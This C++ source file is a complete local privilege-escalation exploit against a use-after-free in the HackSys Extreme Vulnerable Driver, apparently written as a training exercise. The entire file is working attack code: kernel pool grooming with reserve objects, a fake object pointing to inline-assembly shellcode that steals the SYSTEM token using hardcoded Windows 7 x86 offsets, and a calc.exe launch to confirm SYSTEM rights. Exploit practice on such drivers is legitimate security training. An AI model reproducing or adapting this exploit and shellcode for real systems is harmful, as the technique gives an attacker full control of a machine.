#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

//from https://www.nirsoft.net/kernel_struct/vista/UNICODE_STRING.html
typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	WORD * Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


//from https://www.nirsoft.net/kernel_struct/vista/OBJECT_ATTRIBUTES.html
typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

//from https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp
#define IOCO 1
typedef NTSTATUS(__stdcall *NtAllocateReserveObject_t) (OUT PHANDLE hObject, IN POBJECT_ATTRIBUTES ObjectAttributes, IN DWORD ObjectType);


// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID

VOID TokenStealingShellcodeWin7Generic() {
	// No Need of Kernel Recovery as we are not corrupting anything
	__asm {
		; initialize
		pushad; save registers state

		xor eax, eax; Set zero
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current _EPROCESS structure

		mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM
			; to current process
			popad; restore registers state
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD dwBytesReturned;
	LPCWSTR lpDeviceName = TEXT("\\\\.\\HackSysExtremeVulnerableDriver");

	printf("Getting the device handle\r\n");
	//HANDLE WINAPI CreateFile( _In_ lpFileName, _In_ dwDesiredAccess, _In_ dwShareMode, _In_opt_ lpSecurityAttributes,
	//_In_ dwCreationDisposition, _In_ dwFlagsAndAttributes, _In_opt_ hTemplateFile );
	HANDLE hDriver = CreateFile(lpDeviceName,			//File name - in this case our device name
		GENERIC_READ | GENERIC_WRITE,					//dwDesiredAccess - type of access to the file, can be read, write, both or neither. We want read and write because thats the permission the driver declares we need.
		FILE_SHARE_READ | FILE_SHARE_WRITE,				//dwShareMode - other processes can read and write to the driver while we're using it but not delete it - FILE_SHARE_DELETE would enable this.
		NULL,											//lpSecurityAttributes - Optional, security descriptor for the returned handle and declares whether inheriting processes can access it - unneeded for us.
		OPEN_EXISTING,									//dwCreationDisposition - what to do if the file/device doesn't exist, in this case only opens it if it already exists, returning an error if it doesn't.
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,	//dwFlagsAndAttributes - In this case the FILE_ATTRIBUTE_NORMAL means that the device has no special file attributes and FILE_FLAG_OVERLAPPED means that the device is being opened for async IO.
		NULL);											//hTemplateFile - Optional, only used when creating a new file - takes a handle to a template file which defineds various attributes for the file being created.

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle :( 0x%X\r\n", GetLastError());
		return 1;
	}

	printf("Got the device Handle: 0x%X\r\n", hDriver);


	HANDLE hReserveObjectsDefrag[10000] = { 0x0 };
	HANDLE hReserveObjectsPoolGroom[5000] = { 0x0 };


	HMODULE hModule = LoadLibraryA("ntdll.dll");

	if (hModule == NULL) {
		printf("Couldn't load ntdll, how is computer running? : 0x%X\n", GetLastError());
		return 1;
	}

	NtAllocateReserveObject_t NtAllocateReserveObject = (NtAllocateReserveObject_t) GetProcAddress(hModule, "NtAllocateReserveObject");

	if (NtAllocateReserveObject == NULL) {
		printf("Couldn't get a reference to NtAllocateReserveObject in ntdll?!: 0x%X\n", GetLastError());
		return 1;
	}

	for (unsigned int i = 0; i < 0x1000; i++) {
		NTSTATUS status = NtAllocateReserveObject(&hReserveObjectsDefrag[i], 0, IOCO);

		if (status != 0) {
			printf("Failed to allocate defrag reserve object 0x%X: 0x%X\n", i, GetLastError());
			return 1;
		}
	}

	for (unsigned int i = 0; i < 0x500; i++) {
		NTSTATUS status = NtAllocateReserveObject(&hReserveObjectsPoolGroom[i], 0, IOCO);

		if (status != 0) {
			printf("Failed to allocate pool groom reserve object 0x%X: 0x%X\n", i, GetLastError());
			return 1;
		}
	}

	for (unsigned int i = 1; i < 0x500; i += 2) {
		if (!CloseHandle(hReserveObjectsPoolGroom[i])) {
			printf("Failed to free reserve object needed for pool hole punching 0x%X: 0x%X\n", i, GetLastError());
			return 1;
		}
	}

	printf("Pool grooming complete!\r\n");

	DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

	printf("UAF object created.\r\n");

	DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

	printf("UAF object free'd.\r\n");

	size_t nInBufferSize = 0x58;
	PULONG lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);

	if (!lpInBuffer) {
		printf("HeapAlloc failed :( 0x%X\r\n", GetLastError());
		return 1;
	}
	printf("Input buffer allocated as 0x%X bytes.\r\n", nInBufferSize);
	printf("Input buffer address: 0x%p\r\n", lpInBuffer);

	printf("Filling buffer with A's.\r\n");
	memset(lpInBuffer, 0x41, nInBufferSize);

	printf("Loading shellcode pointer into start of buffer.\r\n");
	lpInBuffer[0] = (ULONG)&TokenStealingShellcodeWin7Generic;

	for (unsigned int i = 0; i < 0x250; i++) {
		DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT, lpInBuffer, 0, NULL, 0, &dwBytesReturned, NULL);
	}
	printf("0x250 fake object's allocated.\r\n");

	DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

	printf("UAF object used.\r\n");
	
	printf("SYSTEM?!?!\r\n");
	system("calc.exe");
	
	printf("Exploit complete, cleaning up\n");
	for (unsigned int i = 0; i < 0x1000; i++) {
		if (!CloseHandle(hReserveObjectsDefrag[i])) {
			printf("Failed to free reserve object defrag object 0x%X: 0x%X\r\n", i, GetLastError());
			return 1;
		}
	}
	for (unsigned int i = 0; i < 0x500; i += 2) {
		if (!CloseHandle(hReserveObjectsPoolGroom[i])) {
			printf("Failed to free reserve object pool groom object 0x%X: 0x%X\r\n",i, GetLastError());
			return 1;
		}
	}
	HeapFree(GetProcessHeap(), 0, lpInBuffer);
	CloseHandle(hDriver);
	return 0;
}